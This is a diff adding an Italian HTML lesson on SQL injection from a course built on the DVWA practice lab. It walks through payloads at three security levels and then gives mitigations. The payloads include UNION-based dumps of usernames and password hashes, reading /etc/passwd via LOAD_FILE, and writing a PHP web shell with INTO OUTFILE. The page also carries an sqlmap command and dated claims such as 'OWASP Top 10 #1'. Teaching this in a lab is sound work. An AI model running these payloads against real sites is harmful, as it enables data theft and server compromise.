@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="it">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>07 - SQL Injection | DVWA Cybersecurity Course</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+
+<body>
+    <div class="slide-container">
+
+        <section class="section">
+            <h1>💉 SQL Injection</h1>
+            <p class="hero-subtitle">
+                La vulnerabilità più critica delle applicazioni web: manipolare database tramite input malevoli
+            </p>
+        </section>
+
+        <section class="section">
+            <h2 class="section-title">📖 Cos'è la SQL Injection?</h2>
+
+            <div class="card">
+                <h3>Definizione</h3>
+                <p>
+                    La <strong>SQL Injection (SQLi)</strong> è una tecnica di code injection che sfrutta
+                    vulnerabilità nella validazione dell'input per manipolare query SQL. Un attaccante può:
+                </p>
+                <ul>
+                    <li>📊 Estrarre dati sensibili dal database</li>
+                    <li>🔓 Bypassare autenticazione</li>
+                    <li>✏️ Modificare o eliminare dati</li>
+                    <li>💣 Eseguire comandi amministrativi sul database</li>
+                    <li>🚀 In alcuni casi, eseguire comandi sul sistema operativo</li>
+                </ul>
+            </div>
+
+            <div class="card">
+                <h3>Come Funziona?</h3>
+                <p>
+                    Le applicazioni costruiscono query SQL concatenando stringhe con input utente.
+                    Senza validazione, l'input può contenere comandi SQL che alterano la query originale.
+                </p>
+
+                <h4>Esempio Vulnerabile:</h4>
+                <pre><code>// Codice PHP vulnerabile
+$id = $_GET['id'];
+$query = "SELECT * FROM users WHERE id = '$id'";
+$result = mysqli_query($db, $query);</code></pre>
+
+                <h4>Input Normale:</h4>
+                <pre><code>id = 1
+Query: SELECT * FROM users WHERE id = '1'</code></pre>
+
+                <h4>Input Malevolo:</h4>
+                <pre><code>id = 1' OR '1'='1
+Query: SELECT * FROM users WHERE id = '1' OR '1'='1'</code></pre>
+
+                <p>La condizione <code>'1'='1'</code> è sempre vera, quindi la query restituisce TUTTI i record!</p>
+            </div>
+
+            <div class="card">
+                <h3>Tipi di SQL Injection</h3>
+                <ul>
+                    <li><strong>In-Band SQLi</strong>: Risultati visibili direttamente nella risposta
+                        <ul>
+                            <li><strong>Error-based</strong>: Sfrutta messaggi di errore SQL</li>
+                            <li><strong>UNION-based</strong>: Usa UNION per combinare risultati</li>
+                        </ul>
+                    </li>
+                    <li><strong>Blind SQLi</strong>: Nessun output diretto, si deduce dai cambiamenti
+                        <ul>
+                            <li><strong>Boolean-based</strong>: Basata su risposte true/false</li>
+                            <li><strong>Time-based</strong>: Basata su ritardi (<code>SLEEP()</code>)</li>
+                        </ul>
+                    </li>
+                    <li><strong>Out-of-Band SQLi</strong>: Dati estratti tramite canali alternativi (DNS, HTTP)</li>
+                </ul>
+            </div>
+        </section>
+
+        <section class="level-section">
+            <h3><span class="badge badge-low">Low Security</span> Vulnerabilità e Sfruttamento</h3>
+
+            <div class="alert alert-danger">
+                <strong>⚠️ Vulnerabilità:</strong> L'ID utente viene preso direttamente dall'input
+                e utilizzato nella query SQL senza alcuna validazione o escaping.
+            </div>
+
+            <div class="card">
+                <h4>Codice Vulnerabile (Concettuale):</h4>
+                <pre><code>$id = $_REQUEST['id'];
+$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
+$result = mysqli_query($db, $query);</code></pre>
+            </div>
+
+            <h4>🎯 Bypass Autenticazione</h4>
+            <div class="card">
+                <h4>Payload:</h4>
+                <pre><code>1' OR '1'='1'#</code></pre>
+
+                <div class="spoiler">
+                    <div class="spoiler-content">
+                        <h4>💡 Query Risultante:</h4>
+                        <pre><code>SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1'#'</code></pre>
+
+                        <p>
+                            Il carattere <code>#</code> commenta il resto della query.
+                            La condizione <code>'1'='1'</code> è sempre vera, quindi vengono
+                            restituiti TUTTI gli utenti dal database.
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <h4>🎯 Enumerazione Database con UNION</h4>
+            <div class="card">
+                <p>
+                    L'operatore <code>UNION</code> permette di combinare risultati di query multiple.
+                    Possiamo usarlo per estrarre dati da altre tabelle.
+                </p>
+
+                <h4>Step 1: Scoprire Tabelle</h4>
+                <pre><code>' UNION SELECT table_name, NULL FROM information_schema.tables #</code></pre>
+
+                <div class="spoiler">
+                    <div class="spoiler-content">
+                        <h4>💡 Spiegazione:</h4>
+                        <p>
+                            <code>information_schema.tables</code> è una tabella di sistema MySQL
+                            che contiene informazioni su tutte le tabelle nel database.
+                        </p>
+                        <p>
+                            <code>NULL</code> è usato per match del numero di colonne (la query
+                            originale seleziona 2 colonne: first_name, last_name).
+                        </p>
+                    </div>
+                </div>
+
+                <h4>Step 2: Scoprire Colonne della Tabella 'users'</h4>
+                <pre><code>' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' #</code></pre>
+
+                <div class="spoiler">
+                    <div class="spoiler-content">
+                        <p>Questo rivela i nomi delle colonne nella tabella users, ad esempio:</p>
+                        <ul>
+                            <li>user_id</li>
+                            <li>user</li>
+                            <li>password</li>
+                            <li>first_name</li>
+                            <li>last_name</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <h4>Step 3: Estrarre Username e Password</h4>
+                <pre><code>' UNION SELECT user, password FROM users #</code></pre>
+
+                <div class="spoiler">
+                    <div class="spoiler-content">
+                        <h4>💡 Risultato:</h4>
+                        <p>Vengono estratti tutti gli username e gli hash delle password dal database!</p>
+                        <pre><code>admin:5f4dcc3b5aa765d61d8327deb882cf99
+gordonb:e99a18c428cb38d5f260853678922e03
+smithy:5f4dcc3b5aa765d61d8327deb882cf99
+...</code></pre>
+
+                        <p>
+                            Gli hash possono poi essere crackati con strumenti come John the Ripper,
+                            hashcat, o database online di hash precalcolati (rainbow tables).
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <h4>🎯 Tecniche Avanzate</h4>
+            <div class="card">
+                <h4>Dump Completo Database:</h4>
+                <pre><code># Estrarre versione MySQL
+' UNION SELECT @@version, NULL #
+
+# Estrarre database corrente
+' UNION SELECT database(), NULL #
+
+# Estrarre tutti i nomi di database
+' UNION SELECT schema_name, NULL FROM information_schema.schemata #
+
+# Leggere file di sistema (se permessi MySQL)
+' UNION SELECT LOAD_FILE('/etc/passwd'), NULL #
+
+# Scrivere web shell (se permessi MySQL)
+' UNION SELECT '&lt;?php system($_GET["cmd"]); ?&gt;', NULL INTO OUTFILE '/var/www/html/shell.php' #</code></pre>
+            </div>
+        </section>
+
+        <section class="level-section">
+            <h3><span class="badge badge-medium">Medium Security</span> Protezioni Implementate</h3>
+
+            <div class="alert alert-warning">
+                <strong>🛡️ Nuove Difese:</strong>
+                <ul>
+                    <li>Uso di <code>mysqli_real_escape_string()</code> per escape caratteri speciali</li>
+                    <li>Input ID tramite dropdown (form SELECT) invece di campo testo</li>
+                </ul>
+            </div>
+
+            <div class="card">
+                <h4>Codice di Protezione:</h4>
+                <pre><code>$id = mysqli_real_escape_string($db, $_POST['id']);
+$query = "SELECT first_name, last_name FROM users WHERE user_id = $id";</code></pre>
+
+                <p>
+                    <code>mysqli_real_escape_string()</code> aggiunge backslash prima di caratteri
+                    speciali come virgolette singole, doppi, backslash, e NULL.
+                </p>
+            </div>
+
+            <h4>🎯 Bypass con Burp Suite</h4>
+            <div class="card">
+                <p>
+                    Il dropdown limita solo l'interfaccia utente, ma possiamo intercettare e
+                    modificare la richiesta HTTP.
+                </p>
+
+                <h4>Procedura:</h4>
+                <ol>
+                    <li>Configurare Burp Suite per intercettare traffico</li>
+                    <li>Selezionare un ID valido dal dropdown e inviare</li>
+                    <li>Intercettare la richiesta POST</li>
+                    <li>Modificare il parametro <code>id</code> con payload SQL:
+                        <pre><code>id=1 UNION SELECT user, password FROM users #</code></pre>
+                    </li>
+                    <li>Inoltrare la richiesta modificata</li>
+                </ol>
+
+                <div class="spoiler">
+                    <div class="spoiler-content">
+                        <h4>💡 Perché Funziona (Parzialmente):</h4>
+                        <p>
+                            Nota che il payload NON usa virgolette singole! La query originale usa:
+                            <code>WHERE user_id = $id</code> (senza virgolette attorno a $id).
+                        </p>
+                        <p>
+                            Quindi <code>mysqli_real_escape_string()</code> non ha effetto perché
+                            non stiamo usando caratteri che necessitano escaping in un contesto numerico.
+                        </p>
+                        <p>
+                            <strong>Lezione:</strong> L'escaping non è sufficiente. Serve validazione
+                            del tipo di dato!
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="level-section">
+            <h3><span class="badge badge-high">High Security</span> Protezioni Avanzate</h3>
+
+            <div class="alert alert-info">
+                <strong>🛡️ Difese Implementate:</strong> La query SQL è in una pagina separata
+                accessibile tramite popup. L'ID di sessione può essere modificato per SQL Injection.
+            </div>
+
+            <div class="card">
+                <h4>Meccanismo:</h4>
+                <p>
+                    Cliccando su "Click here to change your ID", si apre una nuova finestra dove
+                    è possibile modificare l'ID di sessione. Questo ID viene poi usato per la query.
+                </p>
+            </div>
+
+            <h4>🎯 Exploitation</h4>
+            <div class="card">
+                <h4>Procedura:</h4>
+                <ol>
+                    <li>Cliccare sul link per cambiare ID (apre popup)</li>
+                    <li>Nella nuova finestra, inserire payload SQL nell'input ID:
+                        <pre><code>' UNION SELECT user, password FROM users #</code></pre>
+                    </li>
+                    <li>Inviare il form</li>
+                </ol>
+
+                <div class="spoiler">
+                    <div class="spoiler-content">
+                        <h4>💡 Risultato:</h4>
+                        <p>
+                            Anche a livello "High", la vulnerabilità SQL Injection persiste perché
+                            l'input non è validato correttamente. L'uso di <code>mysqli_real_escape_string()</code>
+                            non è sufficiente se la query può essere manipolata.
+                        </p>
+                        <p>
+                            Vengono estratti username e hash password di tutti gli utenti.
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="mitigation-box">
+            <h2>🛡️ Strategie di Mitigazione</h2>
+
+            <div class="card">
+                <h3>1. Prepared Statements (Parametrized Queries) ⭐</h3>
+                <p>
+                    <strong>LA SOLUZIONE PIÙ EFFICACE</strong> - Separare completamente codice SQL
+                    da dati utente.
+                </p>
+
+                <h4>PHP (PDO):</h4>
+                <pre><code>$stmt = $pdo->prepare('SELECT * FROM users WHERE user_id = :id');
+$stmt->execute(['id' => $id]);
+$user = $stmt->fetch();</code></pre>
+
+                <h4>PHP (MySQLi):</h4>
+                <pre><code>$stmt = $mysqli->prepare('SELECT * FROM users WHERE user_id = ?');
+$stmt->bind_param('i', $id);
+$stmt->execute();
+$result = $stmt->get_result();</code></pre>
+
+                <h4>Python:</h4>
+                <pre><code>cursor.execute('SELECT * FROM users WHERE user_id = %s', (id,))</code></pre>
+
+                <h4>Node.js:</h4>
+                <pre><code>connection.query('SELECT * FROM users WHERE user_id = ?', [id], callback);</code></pre>
+
+                <p>
+                    ✅ I parametri vengono trattati come dati, mai come codice SQL<br>
+                    ✅ Impossibile iniettare comandi SQL<br>
+                    ✅ Performance migliorate (query plan caching)
+                </p>
+            </div>
+
+            <div class="card">
+                <h3>2. ORM (Object-Relational Mapping)</h3>
+                <ul>
+                    <li><strong>PHP</strong>: Laravel Eloquent, Doctrine</li>
+                    <li><strong>Python</strong>: Django ORM, SQLAlchemy</li>
+                    <li><strong>Node.js</strong>: Sequelize, TypeORM</li>
+                    <li><strong>Java</strong>: Hibernate</li>
+                </ul>
+
+                <pre><code>// Laravel Eloquent
+$user = User::where('id', $id)->first();
+
+// Django ORM
+user = User.objects.get(id=id)</code></pre>
+
+                <p>ORM genera automaticamente prepared statements sicuri.</p>
+            </div>
+
+            <div class="card">
+                <h3>3. Input Validation</h3>
+                <ul>
+                    <li><strong>Whitelist</strong>: Permettere solo pattern conosciuti e sicuri</li>
+                    <li><strong>Type checking</strong>: Validare tipo di dato (int, string, email, etc.)</li>
+                    <li><strong>Range checking</strong>: Verificare che i valori siano nel range valido</li>
+                    <li><strong>Length limits</strong>: Limitare lunghezza input</li>
+                </ul>
+
+                <pre><code>// Validazione ID numerico
+if (!is_numeric($id) || $id < 1 || $id > 1000000) {
+    die('Invalid ID');
+}
+$id = (int)$id;  // Cast a integer</code></pre>
+            </div>
+
+            <div class="card">
+                <h3>4. Stored Procedures</h3>
+                <p>
+                    Incapsulare logica SQL in stored procedures che accettano solo parametri tipizzati.
+                </p>
+
+                <pre><code>-- MySQL Stored Procedure
+DELIMITER //
+CREATE PROCEDURE GetUser(IN userId INT)
+BEGIN
+    SELECT * FROM users WHERE user_id = userId;
+END //
+DELIMITER ;
+
+-- Chiamata da PHP
+$stmt = $mysqli->prepare('CALL GetUser(?)');
+$stmt->bind_param('i', $id);</code></pre>
+            </div>
+
+            <div class="card">
+                <h3>5. Principle of Least Privilege</h3>
+                <ul>
+                    <li>Account database con privilegi minimi necessari</li>
+                    <li>Permessi separati per read/write/admin</li>
+                    <li>Disabilitare funzioni pericolose (<code>LOAD_FILE</code>, <code>INTO OUTFILE</code>)</li>
+                    <li>Account diversi per applicazioni diverse</li>
+                </ul>
+
+                <pre><code>-- Crea utente con permessi limitati
+CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'password';
+GRANT SELECT, INSERT, UPDATE ON database.* TO 'webapp'@'localhost';
+-- NO DELETE, NO DROP, NO CREATE, NO LOAD_FILE</code></pre>
+            </div>
+
+            <div class="card">
+                <h3>6. Web Application Firewall (WAF)</h3>
+                <ul>
+                    <li>ModSecurity con OWASP Core Rule Set</li>
+                    <li>Cloudflare WAF</li>
+                    <li>AWS WAF</li>
+                    <li>Pattern detection per SQL injection (UNION, OR 1=1, etc.)</li>
+                </ul>
+            </div>
+
+            <div class="card">
+                <h3>7. Error Handling Sicuro</h3>
+                <ul>
+                    <li>❌ Non mostrare errori SQL dettagliati agli utenti</li>
+                    <li>✅ Loggare errori server-side</li>
+                    <li>✅ Mostrare messaggi generici agli utenti</li>
+                </ul>
+
+                <pre><code>// INSICURO
+mysqli_query($db, $query) or die(mysqli_error($db));
+
+// SICURO
+try {
+    $stmt->execute();
+} catch (PDOException $e) {
+    error_log($e->getMessage());
+    die('Database error occurred. Please try again.');
+}</code></pre>
+            </div>
+
+            <div class="card">
+                <h3>8. Security Testing</h3>
+                <ul>
+                    <li><strong>Static Analysis</strong>: SonarQube, Semgrep</li>
+                    <li><strong>Dynamic Analysis</strong>: SQLMap, Burp Suite Scanner</li>
+                    <li><strong>Penetration Testing</strong>: Test regolari da security team</li>
+                    <li><strong>Bug Bounty</strong>: Programmi di ricompensa per vulnerabilità</li>
+                </ul>
+
+                <h4>SQLMap Example:</h4>
+                <pre><code>sqlmap -u "http://target.com/page.php?id=1" --dbs --batch</code></pre>
+            </div>
+
+            <div class="card">
+                <h3>9. Defense in Depth</h3>
+                <p>Combinare multiple strategie:</p>
+                <ul>
+                    <li>✅ Prepared Statements (primaria)</li>
+                    <li>✅ Input Validation (secondaria)</li>
+                    <li>✅ WAF (terziaria)</li>
+                    <li>✅ Least Privilege (contenimento)</li>
+                    <li>✅ Monitoring & Logging (rilevamento)</li>
+                </ul>
+            </div>
+        </section>
+
+        <section class="section">
+            <div class="alert alert-success">
+                <h3>📌 Riepilogo</h3>
+                <p>
+                    La SQL Injection è una delle vulnerabilità più critiche e diffuse. Permette
+                    accesso non autorizzato a dati sensibili, modifica database, e in alcuni casi
+                    compromissione completa del sistema.
+                </p>
+                <p>
+                    <strong>Soluzione definitiva:</strong> Prepared Statements (parametrized queries)
+                    combinati con input validation e principle of least privilege. Mai concatenare
+                    direttamente input utente nelle query SQL!
+                </p>
+                <p>
+                    <strong>OWASP Top 10 #1:</strong> Le vulnerabilità di injection (inclusa SQLi)
+                    sono al primo posto nella lista OWASP delle vulnerabilità più critiche.
+                </p>
+            </div>
+        </section>
+
+    </div>
+
+    <div class="nav-container">
+        <button class="nav-btn" id="nav-home" onclick="window.location.href='index.html'">🏠 Home</button>
+        <button class="nav-btn" id="nav-prev" onclick="window.location.href='06_insecure_captcha.html'">←
+            Precedente</button>
+        <span class="nav-info" id="progress">8 / 8</span>
+        <button class="nav-btn" id="nav-next" disabled>Successivo →</button>
+    </div>
+
+    <script src="navigation.js"></script>
+</body>
+
+</html>
